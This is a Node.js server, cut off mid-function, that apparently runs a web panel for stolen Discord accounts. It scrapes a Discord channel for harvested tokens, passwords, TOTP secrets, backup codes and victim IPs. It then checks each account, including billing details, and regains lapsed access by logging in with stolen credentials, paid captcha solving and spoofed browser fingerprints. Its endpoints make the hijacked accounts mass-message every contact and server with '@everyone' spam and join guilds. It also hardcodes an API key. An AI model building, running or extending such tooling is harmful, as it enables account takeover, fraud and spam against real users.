'use strict';
const express    = require('express');
const http       = require('http');
const { Server } = require('socket.io');
const axios      = require('axios');
const { Session: TlsSession } = require('tls-client');
const { HttpsProxyAgent } = require('https-proxy-agent');
const path       = require('path');
const fs         = require('fs');
const crypto     = require('crypto');
const { authenticator } = require('otplib');
const WebSocket  = require('ws');

// ─── Config ───────────────────────────────────────────────
const USER_TOKEN  = process.env.USER_TOKEN || '';
const GUILD_ID    = '1465555562841247758';
const CHANNEL_ID  = '1477765122184187956';
const API         = 'https://discord.com/api/v9';
const UA          = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36';
const CHROME_VER  = '136';
const SEC_CH_UA   = `"Chromium";v="${CHROME_VER}", "Google Chrome";v="${CHROME_VER}", "Not.A/Brand";v="24"`;
const BUILD       = 368827;
const PORT        = process.env.PORT || 3500;
const ANTICAPTCHA_KEY = process.env.ANTICAPTCHA_KEY || 'b7a1846d602861ef723c924eee4de940';

// Paths relative to this file's parent directory (the workspace root)
const ROOT            = path.join(__dirname, '..');
const TOKENS_OLD_FILE = path.join(ROOT, 'token_data_old.txt');
const PROXIES_FILE    = path.join(ROOT, 'proxies.txt');
const IMPORTANT_FILE  = path.join(ROOT, 'important.txt');
const TOKENS_CACHE    = path.join(__dirname, 'tokens_cache.json');

// Railway IP prefixes to ignore when extracting real IP
const RAILWAY_PREFIXES = ['34.', '35.', '10.', '172.', '100.'];

// ─── Proxy ────────────────────────────────────────────────
function loadProxy() {
  try {
    const lines = fs.readFileSync(PROXIES_FILE, 'utf-8').split('\n');
    for (const l of lines) {
      const t = l.trim();
      if (!t || t.startsWith('#')) continue;
      return t;
    }
  } catch (_) {}
  return null;
}
const PROXY_URL = loadProxy();
const proxyAgent = PROXY_URL ? new HttpsProxyAgent(PROXY_URL) : null;

// ─── TLS Session — used ONLY for login/reauth (Chrome TLS fingerprint) ───
let _tlsSess     = null;
let _fingerprint = null;
let _tlsInitPromise = null;

function initTlsSession() {
  if (_tlsInitPromise) return _tlsInitPromise;
  _tlsInitPromise = (async () => {
    _tlsSess = new TlsSession({
      clientIdentifier: 'chrome_133',
      ...(PROXY_URL ? { proxyUrl: PROXY_URL } : {}),
    });
    // Step 1: visit login page → Cloudflare cookies (5s timeout)
    try {
      await Promise.race([
        _tlsSess.get('https://discord.com/login', { headers: {
          'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9', 'Sec-Fetch-Dest': 'document',
          'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none',
        }}),
        new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 8000))
      ]);
    } catch(_) {}
    // Step 2: fetch X-Fingerprint from /experiments (5s timeout)
    try {
      const r = await Promise.race([
        _tlsSess.get(`${API}/experiments`, { headers: {
          'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://discord.com', 'Referer': 'https://discord.com/login',
          'User-Agent': UA, 'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
        }}),
        new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 8000))
      ]);
      if (r.status === 200) {
        _fingerprint = JSON.parse(r.text)?.fingerprint || null;
        if (_fingerprint) console.log('[TLS] Fingerprint:', _fingerprint.slice(0, 24) + '...');
      }
    } catch(_) {}
    return _tlsSess;
  })();
  return _tlsInitPromise;
}
async function getTlsSession() { return initTlsSession(); }

// ─── Helpers ──────────────────────────────────────────────
function sprops() {
  return Buffer.from(JSON.stringify({
    os: 'Windows', browser: 'Chrome', device: '',
    system_locale: 'en-US', browser_user_agent: UA,
    browser_version: `${CHROME_VER}.0.0.0`, os_version: '10',
    referrer: '', referring_domain: '',
    referrer_current: '', referring_domain_current: '',
    release_channel: 'stable',
    client_build_number: BUILD, client_event_source: null
  })).toString('base64');
}

function discordHeaders(token, referer) {
  return {
    'Authorization':         token,
    'User-Agent':            UA,
    'Content-Type':          'application/json',
    'Accept':                '*/*',
    'Accept-Language':       'en-US,en;q=0.9',
    'Origin':                'https://discord.com',
    'Referer':               referer || 'https://discord.com/channels/@me',
    'X-Discord-Locale':      'en-US',
    'X-Discord-Timezone':    'America/New_York',
    'X-Debug-Options':       'bugReporterEnabled',
    'X-Super-Properties':    sprops(),
    'Sec-CH-UA':             SEC_CH_UA,
    'Sec-CH-UA-Mobile':      '?0',
    'Sec-CH-UA-Platform':    '"Windows"',
    'Sec-Fetch-Dest':        'empty',
    'Sec-Fetch-Mode':        'cors',
    'Sec-Fetch-Site':        'same-origin',
  };
}

function makeAxios(token, referer) {
  return axios.create({
    headers: discordHeaders(token, referer),
    timeout: 15000,
    validateStatus: () => true,
    ...(proxyAgent ? { httpsAgent: proxyAgent } : {}),
  });
}

async function dget(token, url) {
  return makeAxios(token).get(url);
}
async function dpost(token, url, data, referer) {
  return makeAxios(token, referer).post(url, data);
}
async function dpatch(token, url, data) {
  return makeAxios(token).patch(url, data);
}
async function ddelete(token, url) {
  return makeAxios(token).delete(url);
}

function parseTls(r) {
  let data;
  try { data = JSON.parse(r.text); } catch(_) { data = r.text; }
  return { status: r.status, data };
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ─── Anti-Captcha solver ──────────────────────────────────
async function solveCaptcha(sitekey, rqdata = '') {
  const api = 'https://api.anti-captcha.com';
  console.log(`[captcha] Solving hCaptcha via Anti-Captcha... sitekey=${sitekey.slice(0,16)}...`);
  const task = {
    type: 'HCaptchaTaskProxyless',
    websiteURL: 'https://discord.com/login',
    websiteKey: sitekey,
    isEnterprise: true,
    userAgent: UA,
  };
  if (rqdata) task.enterprisePayload = { rqdata };
  const cr = await axios.post(`${api}/createTask`, {
    clientKey: ANTICAPTCHA_KEY,
    task,
    languagePool: 'en',
  }, { timeout: 30000 });
  const cj = cr.data || {};
  if (cj.errorId !== 0) throw new Error(`Anti-Captcha createTask error: ${cj.errorDescription || cj.errorCode}`);
  const taskId = cj.taskId;
  if (!taskId) throw new Error('No taskId from Anti-Captcha');
  console.log(`[captcha] Task ${taskId} created, polling...`);
  const t0 = Date.now();
  for (let i = 0; i < 600; i++) {
    const elapsed = (Date.now() - t0) / 1000;
    await sleep(elapsed < 5 ? 500 : elapsed < 20 ? 1000 : 2000);
    const pr = await axios.post(`${api}/getTaskResult`, { clientKey: ANTICAPTCHA_KEY, taskId }, { timeout: 15000 });
    const pj = pr.data || {};
    if (pj.status === 'ready') {
      const token = pj.solution?.gRecaptchaResponse || '';
      if (token.length > 20) {
        console.log(`[captcha] Solved in ${elapsed.toFixed(1)}s (${token.length} chars)`);
        return token;
      }
      throw new Error('Empty captcha token');
    }
    if (pj.errorId !== 0) throw new Error(`Anti-Captcha poll error: ${pj.errorDescription}`);
    if (elapsed > 180) break;
  }
  throw new Error('Anti-Captcha timeout');
}

// ─── In-memory token store ────────────────────────────────
let tokens        = [];   // active valid tokens
let expiredTokens = [];   // expired but stored for recovery

let verifyingCount = 0;

// Active voice WebSocket connections: uid → { ws, hb }
const activeVoiceConns = new Map();
function killVoiceConns() {
  for (const [, conn] of activeVoiceConns) {
    try { if (conn.hb) clearInterval(conn.hb); conn.ws.terminate(); } catch (_) {}
  }
  activeVoiceConns.clear();
}

// ─── Token cache (persists across server restarts) ────────
function saveTokenCache() {
  try { fs.writeFileSync(TOKENS_CACHE, JSON.stringify(tokens), 'utf-8'); }
  catch (e) { console.log(`[cache] Save error: ${e.message}`); }
}
function loadTokenCache() {
  try {
    if (!fs.existsSync(TOKENS_CACHE)) return;
    const data = JSON.parse(fs.readFileSync(TOKENS_CACHE, 'utf-8'));
    if (Array.isArray(data) && data.length) {
      // Mark all as unverified — must Refresh before any action
      tokens = data.map(t => ({ ...t, valid: null }));
      console.log(`[cache] Loaded ${tokens.length} tokens from cache (unverified — hit Refresh)`);
    }
  } catch (e) { console.log(`[cache] Load error: ${e.message}`); }
}

// Load expired from file at startup
function loadExpiredFromFile() {
  if (!fs.existsSync(TOKENS_OLD_FILE)) return;
  const seen = new Map();
  const lines = fs.readFileSync(TOKENS_OLD_FILE, 'utf-8').split('\n');
  for (const l of lines) {
    const s = l.trim();
    if (!s) continue;
    try {
      const d = JSON.parse(s);
      if (!d.token) continue;
      const key = d.user_id || d.token.split('.')[0];
      seen.set(key, d); // later entries overwrite (keep latest)
    } catch (_) {}
  }
  expiredTokens = [...seen.values()].map(d => Object.assign(d, { valid: false, _source: 'file' }));
  console.log(`[startup] Loaded ${expiredTokens.length} expired tokens from file`);
}

function saveExpiredToFile(list) {
  if (!list.length) return;
  try {
    const lines = list.map(t => JSON.stringify(tokenToDict(t)));
    fs.appendFileSync(TOKENS_OLD_FILE, lines.join('\n') + '\n');
    console.log(`[expired] Saved ${list.length} expired tokens`);
  } catch (e) { console.log(`[expired] Save error: ${e.message}`); }
}

function tokenToDict(t) {
  return {
    token: t.token, user_id: t.user_id || '', username: t.username || '',
    display_name: t.display_name || '', email: t.email || '', phone: t.phone || '',
    password: t.password || '', ip: t.ip || '', avatar_url: t.avatar_url || '',
    banner_color: t.banner_color || '', bio: t.bio || '',
    nitro: t.nitro || false, nitro_type: t.nitro_type || 0,
    mfa: t.mfa || false, badges: t.badges || 0, locale: t.locale || '',
    verified: t.verified || false, guilds_count: t.guilds_count || 0,
    friend_count: t.friend_count || 0, dm_count: t.dm_count || 0,
    has_billing: t.has_billing || false, billing_type: t.billing_type || '',
    billing_country: t.billing_country || '', billing_address: t.billing_address || '',
    connections: t.connections || [], boost_guilds: t.boost_guilds || 0,
    totp_secret: t.totp_secret || '', backup_codes: t.backup_codes || '',
    captured_at: t.message_ts || null, expired_at: new Date().toISOString(),
  };
}

// ─── Token fetcher from Discord channel ──────────────────
async function fetchTokensFromChannel() {
  const allTokens = [];
  const seenTokens = new Set();
  const userBest   = {};

  function extract(messages) {
    for (const msg of messages) {
      const ts = msg.timestamp || null;
      let raw = msg.content || '';
      for (const embed of (msg.embeds || [])) {
        raw += '\n' + (embed.title || '');
        raw += '\n' + (embed.description || '');
        raw += '\n' + (embed.author?.name || '');
        raw += '\n' + (embed.footer?.text || '');
        raw += '\n' + (embed.fields || []).map(f => f.name + ': ' + f.value).join('\n');
      }
      for (const att of (msg.attachments || [])) raw += '\n' + (att.url || '');

      const ipMatches = [...raw.matchAll(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g)].map(m => m[1]);
      let ip = '?';
      for (const c of ipMatches) {
        if (!RAILWAY_PREFIXES.some(p => c.startsWith(p))) { ip = c; break; }
      }
      if (ip === '?' && ipMatches.length) ip = ipMatches[0];

      // Support both **Field:** `value` and plain Field: value formats
      function field(patterns) {
        for (const pat of patterns) {
          const m = raw.match(pat);
          if (m) return m[1].trim();
        }
        return '';
      }

      const pw      = field([/\*\*Password:\*\*\s*`([^`]+)`/, /Password:\s*(\S+)/]);
      const origPw  = field([/\*\*Original PW:\*\*\s*`([^`]+)`/, /Original PW:\s*(\S+)/]);
      const totpSec = field([/\*\*TOTP Secret:\*\*\s*`([^`]+)`/, /TOTP Secret:\s*(\S+)/]);
      const uid     = field([/\*\*Discord ID:\*\*\s*`(\d+)`/, /Discord ID:\s*(\d+)/]);
      const email   = field([/\*\*Email:\*\*\s*`([^`\s]+)`/, /Email:\s*(\S+)/]);
      const phoneRaw = field([/\*\*Phone:\*\*\s*`([^`]+)`/, /Phone:\s*(\S+)/]);
      const phone = (phoneRaw && !/^(none|n\/a|-)$/i.test(phoneRaw)) ? phoneRaw : '';
      // Backup codes: may be comma-separated on one line
      const backupStr = field([/\*\*Backup Codes:\*\*\s*`([^`]+)`/, /Backup Codes:\s*(.+)/]);

      const tkMatches = [...raw.matchAll(/([\w-]{24,}\.[\w-]{4,}\.[\w-]{27,})/g)].map(m => m[1]);
      for (const tk of tkMatches) {
        const groupKey = uid || tk.split('.')[0];
        if (!userBest[groupKey]) userBest[groupKey] = { pw: '', origPw: '', ip: '?', totp: '', backup: '', email: '', phone: '' };
        const best = userBest[groupKey];
        if (pw && pw !== '?' && !best.pw) best.pw = pw;
        if (origPw && !best.origPw) best.origPw = origPw;
        if (ip && ip !== '?' && best.ip === '?') best.ip = ip;
        if (totpSec && !best.totp) best.totp = totpSec;
        if (backupStr && !best.backup) best.backup = backupStr;
        if (email && !best.email) best.email = email;
        if (phone && !best.phone) best.phone = phone;

        if (!seenTokens.has(tk)) {
          seenTokens.add(tk);
          allTokens.push({ token: tk, message_ts: ts, _groupKey: groupKey, valid: null,
            user_id: uid, username: '', display_name: '', email: email, phone: phone, avatar_url: '',
            banner_color: '', bio: '', nitro: false, nitro_type: 0, mfa: false, badges: 0,
            locale: '', verified: false, guilds_count: 0, friend_count: 0, dm_count: 0,
            has_billing: false, billing_type: '', billing_country: '', billing_address: '',
            connections: [], boost_guilds: 0, totp_secret: totpSec, backup_codes: backupStr,
            password: pw || origPw, ip: ip, });
        }
      }
    }
  }

  try {
    let r = await dget(USER_TOKEN, `${API}/channels/${CHANNEL_ID}/messages?limit=100`);
    if (r.status !== 200) { console.log(`[fetch] Failed: ${r.status}`); return []; }
    let messages = r.data;
    extract(messages);

    while (messages.length === 100) {
      const lastId = messages[messages.length - 1].id;
      r = await dget(USER_TOKEN, `${API}/channels/${CHANNEL_ID}/messages?limit=100&before=${lastId}`);
      if (r.status !== 200) break;
      messages = r.data;
      if (!messages.length) break;
      extract(messages);
    }
  } catch (e) { console.log(`[fetch] Error: ${e.message}`); }

  // Apply merged data
  for (const t of allTokens) {
    const best = userBest[t._groupKey] || {};
    t.ip           = best.ip    || '?';
    t.password     = best.pw    || best.origPw || '';
    t.totp_secret  = best.totp  || '';
    t.backup_codes = best.backup || '';
    t.email        = best.email || t.email || '';
    t.phone        = best.phone || t.phone || '';
  }
  return allTokens;
}

// ─── Verify a single token ────────────────────────────────
async function verifyToken(t) {
  try {
    const r = await dget(t.token, `${API}/users/@me`);
    if (r.status === 200) {
      const u = r.data;
      t.valid         = true;
      t.user_id       = u.id || '';
      t.username      = u.username || '';
      t.display_name  = u.global_name || u.username || '';
      t.email         = u.email || t.email || '';
      t.phone         = u.phone || '';
      t.nitro_type    = u.premium_type || 0;
      t.nitro         = t.nitro_type > 0;
      t.mfa           = u.mfa_enabled || false;
      t.badges        = u.public_flags || 0;
      t.locale        = u.locale || '';
      t.verified      = u.verified || false;
      t.bio           = u.bio || '';
      t.banner_color  = u.banner_color || '';
      if (u.avatar) {
        const ext = u.avatar.startsWith('a_') ? 'gif' : 'png';
        t.avatar_url = `https://cdn.discordapp.com/avatars/${t.user_id}/${u.avatar}.${ext}?size=128`;
      }
      // Guilds — use as second validity gate (locked tokens 401 here even if @me succeeds)
      try {
        const gr = await dget(t.token, `${API}/users/@me/guilds?limit=200`);
        if (gr.status === 401) { t.valid = false; return t; }
        if (gr.status === 200) t.guilds_count = gr.data.length;
      } catch (_) {}
      // Billing
      try {
        const br = await dget(t.token, `${API}/users/@me/billing/payment-sources`);
        if (br.status === 200 && br.data.length) {
          t.has_billing = true;
          const src = br.data[0];
          const bt  = src.type;
          t.billing_type = { 1: 'Credit Card', 2: 'PayPal', 3: 'Gift Card' }[bt] || `Type ${bt}`;
          const ba = src.billing_address || {};
          t.billing_country  = ba.country || '';
          t.billing_address  = [ba.line_1, ba.city, ba.state, ba.postal_code, ba.country].filter(Boolean).join(', ');
        }
      } catch (_) {}
      // Friends
      try {
        const fr = await dget(t.token, `${API}/users/@me/relationships`);
        if (fr.status === 200) t.friend_count = fr.data.filter(r => r.type === 1).length;
      } catch (_) {}
    } else if (r.status === 401) {
      t.valid = false;
    } else {
      t.valid = null;
    }
  } catch (_) { t.valid = null; }
  return t;
}

// ─── Re-auth (recovery) ───────────────────────────────────
async function reauthToken(t) {
  if (!t.email || t.email === 'N/A') throw new Error('No email');
  if (!t.password || t.password === '?') throw new Error('No password');

  const s = await getTlsSession();
  const loginRef = 'https://discord.com/login';
  const loginHeaders = () => ({
    'Content-Type': 'application/json', 'User-Agent': UA, 'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://discord.com',
    'Referer': loginRef, 'X-Super-Properties': sprops(),
    'X-Track': sprops(),
    'X-Discord-Locale': 'en-US', 'X-Debug-Options': 'bugReporterEnabled',
    'Sec-CH-UA': SEC_CH_UA, 'Sec-CH-UA-Mobile': '?0', 'Sec-CH-UA-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
    ...(_fingerprint ? { 'X-Fingerprint': _fingerprint } : {}),
  });

  const loginBody = {
    login: t.email, password: t.password,
    undelete: false, login_source: null, gift_code_sku_id: null,
  };

  let r1 = parseTls(await s.post(`${API}/auth/login`, { headers: loginHeaders(), json: loginBody }));
  let d1 = r1.data || {};

  // Handle captcha-required on login
  const ckeys = d1.captcha_key || [];
  if (r1.status === 400 && (Array.isArray(ckeys) ? ckeys.includes('captcha-required') : ckeys === 'captcha-required')) {
    const sitekey = d1.captcha_sitekey || 'a9b5fb07-92ff-493f-86fe-352a2803b3df';
    const rqdata  = d1.captcha_rqdata  || '';
    const rqtoken = d1.captcha_rqtoken || '';
    console.log(`[reauth] Captcha required for ${t.email}, solving via Anti-Captcha...`);
    const capToken = await solveCaptcha(sitekey, rqdata);
    const body2 = { ...loginBody, captcha_key: capToken };
    if (rqtoken) body2.captcha_rqtoken = rqtoken;
    r1 = parseTls(await s.post(`${API}/auth/login`, { headers: loginHeaders(), json: body2 }));
    d1 = r1.data || {};
  }

  if (r1.status === 200 && d1.token) return d1.token;

  // MFA — ticket is always top-level
  const ticket = d1.ticket || (typeof d1.mfa === 'object' ? d1.mfa?.ticket : null);
  if (!ticket) throw new Error(`Login failed (${r1.status}): ${d1.message || JSON.stringify(d1).slice(0, 80)}`);

  // TOTP
  if (t.totp_secret) {
    authenticator.options = { digits: 6 };
    const code = authenticator.generate(t.totp_secret);
    const rt = parseTls(await s.post(`${API}/auth/mfa/totp`, { headers: loginHeaders(), json: { code, ticket } }));
    if (rt.status === 200 && rt.data?.token) return rt.data.token;
  }

  // Backup codes
  if (t.backup_codes) {
    const codes = t.backup_codes.replace(/[,;]/g, ' ').split(/\s+/).slice(0, 8);
    for (const raw of codes) {
      const code = raw.replace(/-/g, '').trim();
      if (!code) continue;
      const rb = parseTls(await s.post(`${API}/auth/mfa/backup`, { headers: loginHeaders(), json: { code, ticket } }));
      if (rb.status === 200 && rb.data?.token) return rb.data.token;
    }
  }

  throw new Error('MFA required but TOTP and all backup codes failed');
}

// ─── Express + Socket.IO ──────────────────────────────────
const app    = express();
const server = http.createServer(app);
const io     = new Server(server, { cors: { origin: '*' } });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ─── Job manager (one concurrent job per action key) ──────
const activeJobs = {};
function cancelJob(key) {
  if (activeJobs[key]) { activeJobs[key].cancelled = true; delete activeJobs[key]; }
}
function newJob(key) {
  cancelJob(key);
  const job = { cancelled: false };
  activeJobs[key] = job;
  return job;
}

function emit(room, event, data) { io.to(room).emit(event, data); }
function log(room, msg, color = 'dim') { emit(room, 'log', { msg, color }); }
function stat(room, key, val)  { emit(room, 'stat', { key, val }); }

// ─── REST endpoints ───────────────────────────────────────

// GET /api/tokens — fetch + verify all channel tokens
app.get('/api/tokens', async (req, res) => {
  try {
    const raw = await fetchTokensFromChannel();
    res.json({ ok: true, count: raw.length, tokens: raw.map(t => ({ token: t.token.slice(0,24) + '...', user_id: t.user_id })) });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// POST /api/refresh — re-fetch + verify all tokens
app.post('/api/refresh', async (req, res) => {
  res.json({ ok: true, msg: 'Refresh started' });
  io.emit('refresh_start');
  verifyingCount = 0;
  const raw = await fetchTokensFromChannel();
  const verified = [];
  const nowExpired = [];

  verifyingCount = raw.length;
  io.emit('verifying', { total: raw.length });

  const BATCH = 8;
  for (let i = 0; i < raw.length; i += BATCH) {
    const batch = raw.slice(i, i + BATCH);
    await Promise.all(batch.map(async t => {
      await verifyToken(t);
      verifyingCount--;
      if (t.valid === true) {
        verified.push(t);
      } else if (t.valid === false) {
        nowExpired.push(t);
      }
      io.emit('token_verified', { token: t, remaining: verifyingCount });
    }));
  }

  // Dedup verified by user_id (keep first valid one per account)
  const verifiedMap = new Map();
  for (const t of verified) {
    const key = t.user_id || t.token.split('.')[0];
    if (!verifiedMap.has(key)) verifiedMap.set(key, t);
  }
  // Add newly expired to expiredTokens list
  for (const t of nowExpired) {
    const existing = expiredTokens.find(e => e.user_id && e.user_id === t.user_id);
    if (!existing) expiredTokens.push(t);
  }
  saveExpiredToFile(nowExpired);
  tokens = [...verifiedMap.values()];
  saveTokenCache();
  io.emit('refresh_done', { tokens, expiredCount: expiredTokens.length });
});

// GET /api/state — current in-memory state
app.get('/api/state', (req, res) => {
  res.json({
    tokens: tokens.map(sanitizeToken),
    expiredTokens: expiredTokens.map(sanitizeToken),
    expiredCount: expiredTokens.length,
    proxyUrl: PROXY_URL ? PROXY_URL.replace(/:([^:@]+)@/, ':***@') : null,
  });
});

function sanitizeToken(t) {
  return {
    token:           (t.token || '').slice(0, 24) + '...',
    full_token:      t.token || '',
    user_id:         t.user_id || '',
    username:        t.username || '',
    display_name:    t.display_name || '',
    email:           t.email || '',
    phone:           t.phone || '',
    avatar_url:      t.avatar_url || '',
    nitro:           t.nitro || false,
    nitro_type:      t.nitro_type || 0,
    mfa:             t.mfa || false,
    badges:          t.badges || 0,
    guilds_count:    t.guilds_count || 0,
    friend_count:    t.friend_count || 0,
    has_billing:     t.has_billing || false,
    billing_type:    t.billing_type || '',
    billing_country: t.billing_country || '',
    ip:              t.ip || '',
    valid:           t.valid,
    totp_secret:     t.totp_secret ? '✓' : '',
    backup_codes:    t.backup_codes ? '✓' : '',
    password:        t.password ? '✓' : '',
    message_ts:      t.message_ts || null,
    totp_code:       (() => {
      if (!t.totp_secret) return '';
      try { authenticator.options = { digits: 6 }; return authenticator.generate(t.totp_secret); }
      catch (_) { return 'ERR'; }
    })(),
    totp_remaining:  30 - (Math.floor(Date.now() / 1000) % 30),
  };
}


// ─── Helper: mark a token as expired (got 401 during action) ─
function markTokenExpired(t) {
  t.valid = false;
  const existing = expiredTokens.find(e => e.user_id && e.user_id === t.user_id);
  if (!existing) expiredTokens.push(t);
  io.emit('token_expired', { user_id: t.user_id });
}

// ─── Helper: resolve token list from IDs ─────────────────
function resolveTokens(ids, count = 0) {
  let pool;
  if (!ids || !ids.length) {
    pool = tokens.filter(t => t.valid === true);
  } else {
    pool = tokens.filter(t => t.valid === true && (ids.includes(t.user_id) || ids.includes(t.token)));
  }
  if (count > 0 && count < pool.length) {
    // Fisher-Yates shuffle then slice
    for (let i = pool.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [pool[i], pool[j]] = [pool[j], pool[i]];
    }
    pool = pool.slice(0, count);
  }
  return pool;
}

// ─── Action: Mass DM ──────────────────────────────────────
app.post('/api/action/mass-dm', async (req, res) => {
  const { message, guildDelay = 0.4, dmDelay = 0.8, threads = 10, tokenIds, count = 0 } = req.body;
  if (!message) return res.json({ ok: false, error: 'No message' });
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('mass-dm');
  const room = 'mass-dm';
  const stats = { guild_sent: 0, dm_sent: 0, failed: 0, dead: 0, ratelimit: 0, tokens_done: 0 };

  const sendStat = () => io.to(room).emit('stats', stats);
  log(room, `🚀 Mass Blast · ${list.length} tokens · ${threads} threads`, 'accent');

  async function runToken(t) {
    if (job.cancelled) return;
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    log(room, `── ${uname} ──`, 'cyan');
    let tokenDead = false;

    // Phase 1: DMs
    try {
      const dr = await dget(t.token, `${API}/users/@me/channels`);
      if (dr.status === 401) { stats.dead++; stats.tokens_done++; sendStat(); return; }
      if (dr.status === 200) {
        const dms = dr.data.filter(c => c.type === 1 || c.type === 3);
        for (const ch of dms) {
          if (job.cancelled || tokenDead) break;
          const name = ch.recipients?.[0]?.username || ch.id;
          const t0 = Date.now();
          const r = await dpost(t.token, `${API}/channels/${ch.id}/messages`, { content: message });
          if (r.status === 200) { stats.dm_sent++; log(room, `  ✓ DM → ${name}`, 'green'); }
          else if (r.status === 401) { tokenDead = true; stats.dead++; break; }
          else if (r.status === 429) {
            const wait = (r.data?.retry_after || 5) * 1000;
            stats.ratelimit++;
            if (wait > 30000) { tokenDead = true; break; }
            await sleep(wait + 300);
            continue;
          }
          sendStat();
          const elapsed = Date.now() - t0;
          const rem = dmDelay * 1000 - elapsed;
          if (rem > 0) await sleep(rem);
        }
      }
    } catch (_) {}

    if (tokenDead) { stats.tokens_done++; sendStat(); return; }

    // Phase 2: Guild channels — try ALL text/announcement channels, let Discord 403 handle perms
    try {
      const gr = await dget(t.token, `${API}/users/@me/guilds`);
      if (gr.status !== 200) { stats.tokens_done++; sendStat(); return; }
      const guilds = gr.data;

      for (const guild of guilds) {
        if (job.cancelled || tokenDead) break;
        const gid = guild.id;

        let channels;
        try {
          const cr = await dget(t.token, `${API}/guilds/${gid}/channels`);
          if (cr.status === 401) { tokenDead = true; stats.dead++; break; }
          if (cr.status !== 200) continue;
          channels = cr.data;
        } catch (_) { continue; }

        const text = channels.filter(c => c.type === 0 || c.type === 5);
        for (const ch of text) {
          if (job.cancelled || tokenDead) break;
          const t0 = Date.now();
          const r = await dpost(t.token, `${API}/channels/${ch.id}/messages`, { content: `@everyone ${message}` });
          if (r.status === 200) { stats.guild_sent++; log(room, `  ✓ #${ch.name} (${guild.name})`, 'green'); }
          else if (r.status === 401) { tokenDead = true; stats.dead++; break; }
          else if (r.status === 429) {
            const wait = (r.data?.retry_after || 5) * 1000;
            stats.ratelimit++;
            if (wait > 30000) { tokenDead = true; break; }
            log(room, `  ⏳ #${ch.name} rate-limited ${(wait/1000).toFixed(1)}s`, 'yellow');
            await sleep(wait + 300);
            continue;
          } else if (r.status === 403) {
            log(room, `  · #${ch.name} no perms`, 'dim');
          } else { stats.failed++; }
          sendStat();
          const elapsed = Date.now() - t0;
          const rem = guildDelay * 1000 - elapsed;
          if (rem > 0) await sleep(rem);
        }
      }
    } catch (_) {}

    stats.tokens_done++;
    sendStat();
  }

  // Run with concurrency
  const queue = [...list];
  const workers = Array.from({ length: Math.min(threads, list.length) }, async () => {
    while (queue.length && !job.cancelled) {
      const t = queue.shift();
      if (t) await runToken(t);
    }
  });
  await Promise.all(workers);
  log(room, `═══ Done · guild:${stats.guild_sent} · DM:${stats.dm_sent} · dead:${stats.dead} · rl:${stats.ratelimit} ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Channel Spam ─────────────────────────────────
app.post('/api/action/channel-spam', async (req, res) => {
  const { channelId, guildId, message, delay = 0.3, count: msgCount = 10, tokenIds, count = 0 } = req.body;
  if (!channelId || !message) return res.json({ ok: false, error: 'channelId and message required' });
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('channel-spam');
  const room = 'channel-spam';
  const stats = { sent: 0, failed: 0, ratelimit: 0 };
  const gid = guildId || GUILD_ID;

  log(room, `📢 Channel spam · ${count} msgs/token · ${list.length} tokens`, 'accent');

  // Check which tokens are in the guild
  const eligible = [];
  for (const t of list) {
    if (job.cancelled) break;
    try {
      const r = await dget(t.token, `${API}/users/@me/guilds`);
      if (r.status === 200 && r.data.some(g => g.id === gid)) {
        eligible.push(t);
        log(room, `  ✓ ${t.display_name || t.username} in guild`, 'green');
      } else {
        log(room, `  · ${t.display_name || t.username} not in guild`, 'dim');
      }
    } catch (_) {}
  }

  if (!eligible.length) { log(room, 'No tokens in guild', 'red'); io.to(room).emit('done', stats); return; }

  for (const t of eligible) {
    if (job.cancelled) break;
    const uname = t.display_name || t.username || t.token.slice(0, 12);
    log(room, `── ${uname} ──`, 'cyan');
    for (let n = 0; n < msgCount; n++) {
      if (job.cancelled) break;
      const t0 = Date.now();
      try {
        const r = await dpost(t.token, `${API}/channels/${channelId}/messages`, { content: message });
        if (r.status === 200) { stats.sent++; log(room, `  [${n+1}/${msgCount}] ✓`, 'green'); }
        else if (r.status === 429) {
          const wait = (r.data?.retry_after || 5) * 1000;
          stats.ratelimit++;
          log(room, `  ⏳ ${(wait/1000).toFixed(1)}s`, 'yellow');
          await sleep(wait + 500);
          continue;
        } else if (r.status === 403) { log(room, '  No permission', 'red'); stats.failed++; break; }
        else { stats.failed++; log(room, `  ✗ ${r.status}`, 'red'); }
      } catch (_) { stats.failed++; }
      io.to(room).emit('stats', stats);
      const elapsed = Date.now() - t0;
      const remaining = delay * 1000 - elapsed;
      if (remaining > 0) await sleep(remaining);
    }
  }
  log(room, `═══ Done · ${stats.sent} sent ═══`, 'accent');
  io.to(room).emit('done', stats);
});

// ─── Action: Join Guild ───────────────────────────────────
app.post('/api/action/join-guild', async (req, res) => {
  const { inviteCode, delay = 1.5, tokenIds, count = 0 } = req.body;
  const code = (inviteCode || '').split('/').pop();
  if (!code) return res.json({ ok: false, error: 'No invite code' });
  const list = resolveTokens(tokenIds, +count);
  if (!list.length) return res.json({ ok: false, error: 'No valid tokens' });
  res.json({ ok: true, count: list.length });

  const job = newJob('join-guild');
  const room = 'join-guild';
  const stats = { joined: 0, failed: 0, already: 0 };

  log(room, `🏠 Joining ${code} · ${list.length} tokens`, 'accent');
  for (let i = 0; i < list.length; i++) {
    if (job.cancelled) break;
    const t = list[i];
